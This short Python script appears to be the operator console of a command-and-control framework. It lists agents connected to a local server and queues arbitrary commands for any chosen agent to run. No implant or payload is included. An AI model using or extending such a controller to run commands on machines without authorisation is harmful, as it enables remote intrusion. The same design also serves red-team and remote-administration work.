import requests, json
uri = "http://127.0.0.1:5000"

while True:
    command = input("> ").split()

    if command[0] == "agents":
        agents = json.loads(requests.get(uri+'/commands/agents').text)
        if agents == []:
            print("No agents connected to server.")
            continue
        print("id           host         ip")
        for agent in agents:
            print(f"{agent['id']:<12} {agent['host']:<12} {agent['ip']}")
    elif command[0] == "send":
        agent = command[1] 
        result = requests.post(uri+'/commands/send', data={'agent':command[1], 'command':' '.join(command[2:])}).text
        if result:
            print(result)
        else:
            print("Command successfully queued.")
    elif command[0] == "exit":
        exit()
        